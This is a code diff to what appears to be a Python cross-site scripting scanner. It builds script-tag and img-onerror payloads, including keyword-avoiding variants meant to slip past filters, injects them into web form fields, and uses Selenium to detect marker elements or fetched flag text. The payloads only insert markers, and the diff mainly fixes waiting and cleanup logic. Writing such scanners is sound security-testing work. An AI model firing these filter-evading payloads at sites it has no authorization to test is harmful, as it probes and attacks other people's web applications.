@@ -35,9 +35,9 @@ def script_injections(script: str) -> typing.List[str]:
     image = f'<img src=\'fake_url\' onerror=\'{script}\' />'
     script = f'<script>{script}</script>'
 
-    candidates += [image, bold, script]
-    candidates += utils.bl_avoid(image, ['img', 'src', 'onerror', 'http', 'fetch'])
-    candidates += utils.bl_avoid(script, ['script', 'http', 'fetch'])
+    candidates += [image, script]
+    candidates += utils.bl_avoid(image, ['img', 'src', 'onerror', 'http', 'fetch'], False)
+    candidates += utils.bl_avoid(script, ['script', 'http', 'fetch'], False)
 
     for i in range(len(candidates)):
         candidates[i] = candidates[i].replace('@@index@@', str(i))
@@ -67,7 +67,7 @@ def test_scripts(targets: typing.List[utils.Form], limits: int, delay: typing.Op
     for form in targets:
         for field in form.get_fields():
             gid = generate_id(form.name, field, timestamp, '@@index@@')
-            injections = script_injections(f'document.body.innerHTML+="<br id=\\"{gid}\\" />";')
+            injections = script_injections(f'if(!document.getElementById("{gid}"))document.body.innerHTML+="<br id=\\"{gid}\\" />";')
             for i in range(len(injections)):
                 url, err = form.soupless_request({x : (injections[i] if x == field else '') for x in form.get_fields()})
 
@@ -78,11 +78,12 @@ def test_scripts(targets: typing.List[utils.Form], limits: int, delay: typing.Op
                 driver.get(url)
                 try:
                     c = (selenium.webdriver.common.by.By.ID, generate_id(form.name, field, timestamp, str(i)))
-                    selenium.webdriver.support.ui.WebDriverWait(driver, limits).until(selenium.webdriver.support.expected_conditions.presence_of_element_located(c))
+                    selenium.webdriver.support.ui.WebDriverWait(driver, limits, poll_frequency=max(limits // 4, 1)).until(selenium.webdriver.support.expected_conditions.presence_of_element_located(c))
                     results.append(XSSVuln(form, field, injections[i], 'JS Injection'))
                 except selenium.common.exceptions.TimeoutException:
                     pass
-                driver.close()
+                finally:
+                    driver.close()
                 
                 if delay is not None:
                     time.sleep(delay)
@@ -104,7 +105,7 @@ def test_xss(targets: typing.List[utils.Form], limits: int, delay: typing.Option
     for form in targets:
         for field in form.get_fields():
             gid = generate_id(form.name, field, timestamp, '@@index@@')
-            injections = script_injections(f'fetch("{flag_url}").then(res => res.text()).then(text => document.body.innerHTML+="<span id=\\"{gid}\\">"+text+"</span>");')
+            injections = script_injections(f'if(!document.getElementById("{gid}"))fetch("{flag_url}").then(res => res.text()).then(text => document.body.innerHTML+="<span id=\\"{gid}\\">"+text+"</span>");')
             for i in range(len(injections)):
                 url, err = form.soupless_request({x : (injections[i] if x == field else '') for x in form.get_fields()})
 
@@ -115,11 +116,12 @@ def test_xss(targets: typing.List[utils.Form], limits: int, delay: typing.Option
                 driver.get(url)
                 try:
                     c = (selenium.webdriver.common.by.By.ID, generate_id(form.name, field, timestamp, str(i)))
-                    selenium.webdriver.support.ui.WebDriverWait(driver, limits).until(selenium.webdriver.support.expected_conditions.presence_of_element_located(c))
-                    results.append(XSSVuln(form, field, injections[i], 'JS Injection'))
+                    selenium.webdriver.support.ui.WebDriverWait(driver, limits, poll_frequency=max(limits // 4, 1)).until(selenium.webdriver.support.expected_conditions.text_to_be_present_in_element(c, flag_text))
+                    results.append(XSSVuln(form, field, injections[i], 'XSS'))
                 except selenium.common.exceptions.TimeoutException:
                     pass
-                driver.close()
+                finally:
+                    driver.close()
                 
                 if delay is not None:
                     time.sleep(delay)
